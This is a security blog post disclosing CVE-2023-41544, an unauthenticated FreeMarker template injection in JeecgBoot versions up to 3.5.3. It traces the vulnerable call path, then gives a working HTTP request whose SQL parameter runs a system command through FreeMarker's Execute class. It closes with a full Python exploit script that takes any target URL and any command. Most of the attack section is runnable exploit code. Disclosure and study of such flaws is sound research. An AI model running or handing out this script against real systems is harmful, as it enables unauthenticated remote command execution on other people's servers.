=== Content from pho3n1x-web.github.io_2db7dd8d_20250114_191817.html ===

[**Pho3n1x**](/)

* [Home](/)
* [Archives](/archives/)
* [Categories](/categories/)
* [Tags](/tags/)
* [About](/about/)

September 18, 2023 pm

3.8k words

16 mins

# CVE-2023-41544(JeecgBoot FreeMarker SSTI)

## Description

The JeecgBoot/jeecg boot/jmreport/loadTableData Api interface does not have identity verification. Freemarker is used to process SQL parameters passed in by the user, and arbitrary code is executed on the application side through SSTI.

## Affected version

JeecgBoot <= v3.5.3

## Vulnerability Analysis

`/jeecg-boot/jmreport/loadTableData`interface has SSTI injection of FreeMarkerUtils

Trace call stack

| ``` 1234567 ``` | ``` org.jeecg.modules.jmreport.desreport.a.c->this.reportDbService.parseReportSqlorg.jeecg.modules.jmreport.desreport.service.a.parseReportSql->f.aorg.jeecg.modules.jmreport.desreport.util.f.a->FreeMarkerUtils.aorg.jeecg.modules.jmreport.desreport.render.utils.FreeMarkerUtils.a->(new Template("template", new StringReader(var0), var2)).process(var1, var3) ``` |
| --- | --- |

By writing a payload with a freemarker template in the SQL parameters, template parsing can be triggered, resulting in template injection. Additionally, this version does not restrict classes, so template injection can cause arbitrary command execution

From Routing Processing Logic to the LoadTableData Function

![image-20230918173752359](/./../images/image-20230918173752359.png)

Then use f.a to parse the Freemarker template for SQL

![image-20230918173803314](/./../images/image-20230918173803314.png)

So we can construct the request

| ``` 1234567891011121314151617 ``` | ``` POST /jeecg-boot/jmreport/loadTableData HTTP/1.1Host: localhost:8088User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/json;charset=UTF-8X-Sign: 8DFA6138EFBF3D5ECA9D62F6FB80C84DX-TIMESTAMP: 1692975637994X-Access-Token: nulltoken: nullJmReport-Tenant-Id: nullContent-Length: 178Origin: http://localhost:8088Connection: close{"dbSource":"","sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"cmd /c calc\") }'","tableName":"test_demo);","pageNo":1,"pageSize":10} ``` |
| --- | --- |

#### The actual payload is in the SQL parameters

| ``` 1 ``` | ``` select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"cmd /c calc\") }' ``` |
| --- | --- |

#### The complete utilization script is as follows

| ``` 123456789101112131415161718192021222324252627282930 ``` | ``` import requestsimport jsondef invokecmd(url,cmd):    url=url+"/jeecg-boot/jmreport/loadTableData"    headers = {        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',        'Accept': 'application/json, text/plain, */*',        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',        'Referer': 'http://localhost:8088/jeecg-boot/jmreport/list',        'X-Access-Token': 'null',        'token': 'null',        'JmReport-Tenant-Id': 'null',        'Content-Type': 'application/json',        'Connection': 'close',        'Sec-Fetch-Dest': 'empty',        'Sec-Fetch-Mode': 'no-cors',        'Sec-Fetch-Site': 'same-origin',        'Pragma': 'no-cache',        'Cache-Control': 'no-cache'    }    payload="""{"dbSource":"","sql":"select 'result:<#assign ex=\\"freemarker.template.utility.Execute\\"?new()> ${ ex(\\\""""+cmd+""" \\") }'","tableName":"test_demo);","pageNo":1,"pageSize":10}"""    print(payload)    response=requests.post(url,headers=headers,data=payload)    print("命令执行成功")# invokecmd("http://localhost:8088","calc")if __name__ == '__main__':    url=input("please input your target: (example:http://localhost:8088)")    cmd=input("please input your command: ")    invokecmd(url,cmd) ``` |
| --- | --- |

---

[CVE](/categories/CVE/)

[#CVE](/tags/CVE/)
[#代码审计](/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)
[#JeecgBoot](/tags/JeecgBoot/)

CVE-2023-41544(JeecgBoot FreeMarker SSTI)
https://pho3n1x-web.github.io/2023/09/18/CVE-2023-41544(JeecgBoot\_SSTI)/

Author
Pho3n1x

Posted on
September 18, 2023

Licensed under
[CC BY-NC-SA 4.0](https://CREATIVECOMMONS.ORG/LICENSES/BY-NC-SA/4.0/)

[LimeSurvey GetShell
Previous](/2023/12/26/LimeSurvey_GetShell/ "LimeSurvey GetShell")

[CVE-2023-41543(JeecgBoot Sql Injection)
Next](/2023/09/18/CVE-2023-41543%28JeecgBoot_sql%29/ "CVE-2023-41543(JeecgBoot Sql Injection)")

Table of Contents

#### Search

×

Keyword

[Hexo](https://hexo.io)  [Fluid](https://github.com/fluid-dev/hexo-theme-fluid)

Views:

Visitors:

Blog works best with JavaScript enabled


